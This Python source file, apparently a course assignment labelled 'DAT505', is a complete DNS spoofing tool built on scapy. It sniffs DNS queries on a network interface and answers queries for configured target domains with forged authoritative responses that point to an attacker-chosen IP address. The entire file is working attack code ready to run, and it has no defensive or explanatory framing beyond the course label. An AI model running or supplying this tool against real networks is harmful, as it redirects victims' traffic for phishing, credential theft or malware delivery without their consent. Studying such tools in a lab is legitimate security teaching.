#!/usr/bin/env python3
"""DNS Spoofing Tool - DAT505"""

import argparse
import sys
import json
import signal
from scapy.all import sniff, send, IP, UDP, DNS, DNSQR, DNSRR, conf

class DNSSpoofer:
    def __init__(self, interface, config_file):
        self.interface = interface
        self.config_file = config_file
        self.spoof_ip = None
        self.target_domains = []
        self.queries_spoofed = 0
        conf.iface = interface
        conf.verb = 0
    
    def load_config(self):
        with open(self.config_file, 'r') as f:
            config = json.load(f)
        self.spoof_ip = config.get('spoof_ip')
        self.target_domains = config.get('targets', [])
        
        if not self.spoof_ip or not self.target_domains:
            print("Error: Invalid configuration")
            sys.exit(1)
    
    def should_spoof(self, domain):
        domain = domain.rstrip('.')
        return any(target in domain for target in self.target_domains)
    
    def create_spoofed_response(self, packet):
        qname = packet[DNSQR].qname
        spoofed_pkt = (IP(dst=packet[IP].src, src=packet[IP].dst) /
                      UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
                      DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                          an=DNSRR(rrname=qname, ttl=10, rdata=self.spoof_ip)))
        return spoofed_pkt
    
    def process_packet(self, packet):
        if packet.haslayer(DNS) and packet.haslayer(DNSQR):
            qname = packet[DNSQR].qname.decode('utf-8', errors='ignore')
            if self.should_spoof(qname):
                spoofed = self.create_spoofed_response(packet)
                send(spoofed, verbose=False)
                self.queries_spoofed += 1
                print(f"Spoofed: {qname} -> {self.spoof_ip}")
    
    def start_spoofing(self):
        self.load_config()
        print(f"DNS spoofing started on {self.interface}")
        print(f"Spoofing {len(self.target_domains)} domains to {self.spoof_ip}")
        
        try:
            sniff(iface=self.interface, filter="udp port 53", 
                  prn=self.process_packet, store=False)
        except KeyboardInterrupt:
            print(f"\nSpoofed {self.queries_spoofed} queries")

def main():
    parser = argparse.ArgumentParser(description="DNS Spoofing Tool")
    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    parser.add_argument("-c", "--config", required=True, help="Configuration file")
    args = parser.parse_args()
    
    spoofer = DNSSpoofer(args.interface, args.config)
    
    def signal_handler(sig, frame):
        print(f"\nSpoofed {spoofer.queries_spoofed} queries")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    spoofer.start_spoofing()

if __name__ == "__main__":
    main()
